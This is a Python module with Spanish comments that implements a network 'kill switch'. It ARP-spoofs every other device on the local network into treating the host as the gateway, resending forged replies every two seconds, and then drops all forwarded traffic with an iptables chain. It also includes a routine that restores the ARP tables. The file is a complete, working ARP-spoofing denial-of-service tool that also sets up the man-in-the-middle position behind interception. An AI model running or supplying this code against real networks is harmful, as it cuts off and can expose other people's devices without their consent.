"""
Kill switch: corta el acceso a internet de todos los dispositivos de la red
excepto el host que ejecuta el programa.

Mecanismo:
  1. ARP spoofing: le dice a cada dispositivo que el gateway somos nosotros
  2. iptables DROP en FORWARD: el tráfico que llega a nosotros no se reenvía
  3. Al desactivar: restaura las tablas ARP y elimina las reglas iptables

Requiere: scapy (ya en requirements.txt), root
"""

import subprocess
import threading
import time
import logging
import netifaces

logger = logging.getLogger(__name__)

_CHAIN = 'WIFIDETECT_LOCKDOWN'


# ---------- helpers de red ----------

def get_host_info(iface: str) -> tuple[str, str]:
    """Devuelve (ip, mac) del host en la interfaz dada."""
    addrs = netifaces.ifaddresses(iface)
    ip = addrs[netifaces.AF_INET][0]['addr']
    mac = addrs[netifaces.AF_LINK][0]['addr'].lower()
    return ip, mac


def get_gateway_ip() -> str:
    gws = netifaces.gateways()
    default = gws.get('default', {}).get(netifaces.AF_INET)
    return default[0] if default else ''


def arp_resolve(ip: str, iface: str) -> str:
    """Resuelve IP -> MAC vía ARP. Intenta scapy, luego /proc/net/arp."""
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(
            Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip),
            iface=iface, timeout=2, verbose=False,
        )
        if ans:
            return ans[0][1].hwsrc.lower()
    except Exception:
        pass
    try:
        with open('/proc/net/arp') as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip:
                    mac = parts[3]
                    if mac != '00:00:00:00:00:00':
                        return mac.lower()
    except Exception:
        pass
    return ''


# ---------- iptables ----------

def _chain_exists() -> bool:
    r = subprocess.run(['iptables', '-L', _CHAIN, '-n'],
                       capture_output=True)
    return r.returncode == 0


def setup_lockdown():
    """Crea la cadena LOCKDOWN y bloquea todo el tráfico FORWARD."""
    if not _chain_exists():
        subprocess.run(['iptables', '-N', _CHAIN], capture_output=True)
    subprocess.run(['iptables', '-F', _CHAIN], capture_output=True)
    subprocess.run(['iptables', '-A', _CHAIN, '-j', 'DROP'], capture_output=True)
    # Insertar al principio de FORWARD si no está
    r = subprocess.run(['iptables', '-C', 'FORWARD', '-j', _CHAIN], capture_output=True)
    if r.returncode != 0:
        subprocess.run(['iptables', '-I', 'FORWARD', '1', '-j', _CHAIN],
                       capture_output=True)


def teardown_lockdown():
    """Elimina las reglas iptables del kill switch."""
    subprocess.run(['iptables', '-D', 'FORWARD', '-j', _CHAIN], capture_output=True)
    subprocess.run(['iptables', '-F', _CHAIN], capture_output=True)
    subprocess.run(['iptables', '-X', _CHAIN], capture_output=True)


# ---------- KillSwitch ----------

class KillSwitch:
    def __init__(self, iface: str):
        self.iface = iface
        self._active = False
        self._thread: threading.Thread | None = None
        self._targets: list[tuple[str, str]] = []   # [(ip, mac), ...]
        self._host_ip = ''
        self._host_mac = ''
        self._gw_ip = ''
        self._gw_mac = ''

    @property
    def is_active(self) -> bool:
        return self._active

    def activate(self, devices: list[dict]) -> tuple[bool, str]:
        """
        Activa el kill switch para todos los dispositivos de la lista,
        excepto el host.
        Devuelve (éxito, mensaje_error).
        """
        if self._active:
            return True, ''

        try:
            self._host_ip, self._host_mac = get_host_info(self.iface)
        except Exception as e:
            return False, f'No se pudo obtener info del host: {e}'

        self._gw_ip = get_gateway_ip()
        if not self._gw_ip:
            return False, 'No se detectó el gateway de la red'

        self._gw_mac = arp_resolve(self._gw_ip, self.iface)
        if not self._gw_mac:
            logger.warning('No se pudo resolver MAC del gateway; la restauración ARP será incompleta')

        # Filtrar host propio de los objetivos
        self._targets = [
            (d['ip'], d.get('mac', '').lower())
            for d in devices
            if d.get('ip')
            and d['ip'] != self._host_ip
            and d.get('mac', '').lower() != self._host_mac
        ]

        if not self._targets:
            return False, 'No hay dispositivos activos para bloquear'

        # Habilitar IP forwarding (necesario para que llegue tráfico a nosotros)
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)

        # iptables: DROP todo lo que se intente reenviar
        setup_lockdown()

        self._active = True
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True,
                                        name='killswitch-arp')
        self._thread.start()

        logger.info(f'Kill switch ACTIVADO — {len(self._targets)} dispositivos bloqueados')
        return True, ''

    def deactivate(self) -> bool:
        if not self._active:
            return True
        self._active = False

        # Restaurar ARP en todos los dispositivos
        if self._gw_mac:
            self._restore_arp()

        # Eliminar reglas iptables
        teardown_lockdown()

        logger.info('Kill switch DESACTIVADO — red restaurada')
        return True

    # ------------------------------------------------------------------

    def _spoof_loop(self):
        """Envía ARP replies falsos cada 2s para mantener el spoofing."""
        try:
            from scapy.all import ARP, Ether, sendp
        except ImportError:
            logger.error('scapy no disponible — kill switch no puede hacer ARP spoofing')
            self._active = False
            return

        while self._active:
            for target_ip, target_mac in list(self._targets):
                try:
                    pkt = (
                        Ether(dst=target_mac)
                        / ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=self._gw_ip,
                            hwsrc=self._host_mac,
                        )
                    )
                    sendp(pkt, iface=self.iface, verbose=False)
                except Exception as e:
                    logger.debug(f'ARP spoof error {target_ip}: {e}')
            time.sleep(2)

    def _restore_arp(self):
        """Envía ARP replies correctos para restaurar las tablas ARP."""
        try:
            from scapy.all import ARP, Ether, sendp
            for target_ip, target_mac in self._targets:
                try:
                    pkt = (
                        Ether(dst=target_mac)
                        / ARP(
                            op=2,
                            pdst=target_ip,
                            hwdst=target_mac,
                            psrc=self._gw_ip,
                            hwsrc=self._gw_mac,
                        )
                    )
                    sendp(pkt, iface=self.iface, verbose=False, count=4)
                except Exception as e:
                    logger.debug(f'ARP restore error {target_ip}: {e}')
        except Exception as e:
            logger.error(f'Error en restauración ARP: {e}')
